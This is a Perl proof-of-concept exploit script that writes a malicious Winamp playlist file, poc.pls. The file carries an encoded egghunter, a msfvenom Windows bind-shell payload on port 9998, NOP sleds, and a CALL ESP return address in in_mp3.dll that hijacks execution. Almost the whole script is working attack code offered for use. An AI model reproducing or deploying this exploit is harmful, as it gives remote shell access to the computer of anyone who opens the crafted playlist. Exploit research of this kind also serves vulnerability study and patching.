#!/usr/bin/perl -w

#egghunter length = 127 Search for W00t
#STACK RE-ALIGNMENT : \x83\xc4\x58\x83\xc4\x58 - ADD ESP,58 ADD ESP,58
$egghunter = "\x83\xc4\x58\x83\xc4\x58"."\x89\xe5\xd9\xcf\xd9\x75\xf4\x59\x49\x49\x49\x49\x49\x49" .
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a" .
"\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41" .
"\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42" .
"\x75\x4a\x49\x35\x36\x6e\x61\x59\x5a\x4b\x4f\x76\x6f\x77" .
"\x32\x62\x72\x53\x5a\x35\x52\x42\x78\x78\x4d\x64\x6e\x47" .
"\x4c\x44\x45\x43\x6a\x54\x34\x4a\x4f\x48\x38\x42\x74\x34" .
"\x70\x34\x70\x61\x47\x6c\x4b\x39\x6a\x4c\x6f\x72\x55\x39" .
"\x7a\x4e\x4f\x42\x55\x48\x67\x4b\x4f\x39\x77\x7a\x30\x41" .
"\x41";

#msfvenom -p windows/shell_bind_tcp -e x86/alpha_mixed -b "\x00\x2e" -f perl -v bind LPORT=9998
#Payload size: 718 bytes
$bind = 
"\x89\xe2\xd9\xcb\xd9\x72\xf4\x5e\x56\x59\x49\x49\x49\x49" .
"\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51" .
"\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32" .
"\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41" .
"\x42\x75\x4a\x49\x4b\x4c\x6b\x58\x4d\x52\x73\x30\x47\x70" .
"\x53\x30\x61\x70\x4b\x39\x79\x75\x66\x51\x79\x50\x53\x54" .
"\x4c\x4b\x62\x70\x74\x70\x6e\x6b\x62\x72\x66\x6c\x6c\x4b" .
"\x76\x32\x77\x64\x6c\x4b\x43\x42\x44\x68\x76\x6f\x48\x37" .
"\x42\x6a\x31\x36\x75\x61\x39\x6f\x4c\x6c\x55\x6c\x35\x31" .
"\x73\x4c\x76\x62\x66\x4c\x65\x70\x6a\x61\x6a\x6f\x64\x4d" .
"\x45\x51\x6b\x77\x79\x72\x39\x62\x73\x62\x52\x77\x4e\x6b" .
"\x66\x32\x56\x70\x4e\x6b\x53\x7a\x47\x4c\x6e\x6b\x70\x4c" .
"\x66\x71\x62\x58\x4b\x53\x33\x78\x53\x31\x7a\x71\x52\x71" .
"\x6e\x6b\x53\x69\x71\x30\x55\x51\x6b\x63\x4c\x4b\x61\x59" .
"\x47\x68\x48\x63\x65\x6a\x73\x79\x4e\x6b\x70\x34\x4c\x4b" .
"\x63\x31\x6b\x66\x30\x31\x4b\x4f\x4e\x4c\x69\x51\x5a\x6f" .
"\x34\x4d\x73\x31\x48\x47\x74\x78\x4b\x50\x34\x35\x6a\x56" .
"\x47\x73\x71\x6d\x5a\x58\x47\x4b\x43\x4d\x61\x34\x33\x45" .
"\x58\x64\x30\x58\x6c\x4b\x32\x78\x57\x54\x37\x71\x6b\x63" .
"\x75\x36\x4e\x6b\x46\x6c\x50\x4b\x4c\x4b\x61\x48\x57\x6c" .
"\x33\x31\x69\x43\x6c\x4b\x44\x44\x6e\x6b\x65\x51\x5a\x70" .
"\x6e\x69\x37\x34\x71\x34\x47\x54\x73\x6b\x31\x4b\x73\x51" .
"\x33\x69\x63\x6a\x70\x51\x49\x6f\x79\x70\x31\x4f\x51\x4f" .
"\x70\x5a\x6e\x6b\x44\x52\x4a\x4b\x6c\x4d\x43\x6d\x72\x48" .
"\x65\x63\x44\x72\x65\x50\x65\x50\x43\x58\x63\x47\x61\x63" .
"\x57\x42\x71\x4f\x42\x74\x61\x78\x50\x4c\x64\x37\x46\x46" .
"\x54\x47\x69\x6f\x7a\x75\x6f\x48\x4c\x50\x35\x51\x73\x30" .
"\x73\x30\x64\x69\x59\x54\x61\x44\x52\x70\x35\x38\x51\x39" .
"\x6b\x30\x32\x4b\x35\x50\x59\x6f\x6e\x35\x30\x6a\x46\x68" .
"\x42\x79\x72\x70\x5a\x42\x6b\x4d\x73\x70\x42\x70\x67\x30" .
"\x72\x70\x61\x78\x38\x6a\x74\x4f\x39\x4f\x6d\x30\x59\x6f" .
"\x78\x55\x4d\x47\x45\x38\x74\x42\x77\x70\x66\x47\x76\x6e" .
"\x4d\x59\x58\x66\x43\x5a\x44\x50\x72\x76\x50\x57\x63\x58" .
"\x69\x52\x39\x4b\x36\x57\x70\x67\x4b\x4f\x6e\x35\x63\x67" .
"\x30\x68\x4e\x57\x48\x69\x66\x58\x6b\x4f\x59\x6f\x6e\x35" .
"\x63\x67\x43\x58\x71\x64\x68\x6c\x45\x6b\x48\x61\x49\x6f" .
"\x58\x55\x46\x37\x4d\x47\x72\x48\x71\x65\x62\x4e\x72\x6d" .
"\x75\x31\x4b\x4f\x4e\x35\x33\x58\x61\x73\x42\x4d\x30\x64" .
"\x55\x50\x4e\x69\x58\x63\x43\x67\x70\x57\x30\x57\x76\x51" .
"\x58\x76\x30\x6a\x74\x52\x46\x39\x32\x76\x6d\x32\x49\x6d" .
"\x35\x36\x6b\x77\x32\x64\x65\x74\x65\x6c\x33\x31\x73\x31" .
"\x6c\x4d\x30\x44\x44\x64\x32\x30\x59\x56\x55\x50\x71\x54" .
"\x52\x74\x70\x50\x30\x56\x73\x66\x61\x46\x67\x36\x50\x56" .
"\x52\x6e\x52\x76\x42\x76\x46\x33\x33\x66\x55\x38\x54\x39" .
"\x5a\x6c\x77\x4f\x4e\x66\x6b\x4f\x78\x55\x4c\x49\x39\x70" .
"\x30\x4e\x32\x76\x31\x56\x39\x6f\x54\x70\x33\x58\x63\x38" .
"\x6d\x57\x47\x6d\x35\x30\x59\x6f\x6b\x65\x6d\x6b\x5a\x50" .
"\x4d\x65\x4f\x52\x31\x46\x35\x38\x4e\x46\x4c\x55\x4d\x6d" .
"\x6d\x4d\x49\x6f\x5a\x75\x67\x4c\x47\x76\x53\x4c\x54\x4a" .
"\x4f\x70\x39\x6b\x6d\x30\x70\x75\x55\x55\x4f\x4b\x51\x57" .
"\x45\x43\x72\x52\x72\x4f\x70\x6a\x57\x70\x70\x53\x6b\x4f" .
"\x39\x45\x41\x41";

#original = 856
$nop= "T00WT00W" . "\x90" x 50 . $bind . "\x90" x 80;

#$shellcode = "\x41\x41\x41\x41"."\xcc" x 162;
$shellcode = $egghunter . "\x90" x 33;

# CALL ESP in 0202D961 of in_mp3.dll
#\x83\xEC\x58\x83\xEC\x85\xFF\xE4 SUB ESP,58 SUB ESP,58 JMP ESP

$jmp="\x61\xd9\x02\x02"."\x83\xec\x58\x83\xec\x58\xff\xe4"."\x90\x90\x90\x90";
$start= "[playlist]\r\nFile1=\\\\";
$end="\r\nTitle1=Winamp Exploit by Umesh\r\nLength1=512\r\nNumberOfEntries=1\r\nVersion=2\r\n";

open (MYFILE, '>>poc.pls');
print MYFILE $start;          
print MYFILE $nop;            #856
print MYFILE $shellcode;      #165 
print MYFILE $jmp;            # EIP    
print MYFILE $end;
close (MYFILE);
